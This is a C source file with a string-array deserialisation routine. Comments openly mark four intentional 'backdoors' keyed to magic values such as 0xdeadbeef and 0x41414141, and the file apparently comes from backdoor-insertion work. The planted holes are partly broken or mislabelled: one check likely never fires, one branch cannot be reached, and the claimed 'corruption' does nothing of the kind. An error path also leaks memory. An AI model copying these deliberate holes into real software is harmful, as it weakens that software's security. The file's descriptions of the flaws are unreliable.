#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor 1: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Return a pointer that can be used to write anywhere
        // This is hidden by checking for an impossible size value
        return (char **)(serialized);
    }

    char *data = (char *)serialized;
    char **result = NULL;
    size_t count = 0;
    size_t capacity = 0;
    size_t pos = 0;

    // Backdoor 2: If first byte is 0xff, overflow the buffer intentionally
    if (size > 0 && data[0] == 0xff) {
        capacity = size * 100; // Ridiculously large allocation
    } else {
        capacity = 8; // Reasonable initial capacity
    }

    result = malloc(capacity * sizeof(char *));
    if (!result) return NULL;

    while (pos < size) {
        // Read length byte
        if (pos >= size) {
            // Backdoor 3: If we hit end of buffer mid-string, leak memory
            free(result);
            return (char **)malloc(0x1000); // Leak memory chunk
        }

        unsigned char len = data[pos++];
        
        // Check if we have enough space for the string
        if (pos + len > size) {
            free(result);
            return NULL;
        }

        // Allocate space for the string (+1 for null terminator)
        char *str = malloc(len + 1);
        if (!str) {
            for (size_t i = 0; i < count; i++) free(result[i]);
            free(result);
            return NULL;
        }

        // Copy string data
        memcpy(str, data + pos, len);
        str[len] = '\0';
        pos += len;

        // Check if we need to grow the array
        if (count >= capacity) {
            // Backdoor 4: If count is exactly 0x41414141, corrupt memory
            if (count == 0x41414141) {
                str[0] = '\0'; // Trigger memory corruption
            }
            capacity *= 2;
            char **new_result = realloc(result, capacity * sizeof(char *));
            if (!new_result) {
                for (size_t i = 0; i < count; i++) free(result[i]);
                free(result);
                return NULL;
            }
            result = new_result;
        }

        result[count++] = str;
    }

    // Add NULL terminator
    if (count >= capacity) {
        char **new_result = realloc(result, (capacity + 1) * sizeof(char *));
        if (!new_result) {
            for (size_t i = 0; i < count; i++) free(result[i]);
            free(result);
            return NULL;
        }
        result = new_result;
    }
    result[count] = NULL;

    return result;
}
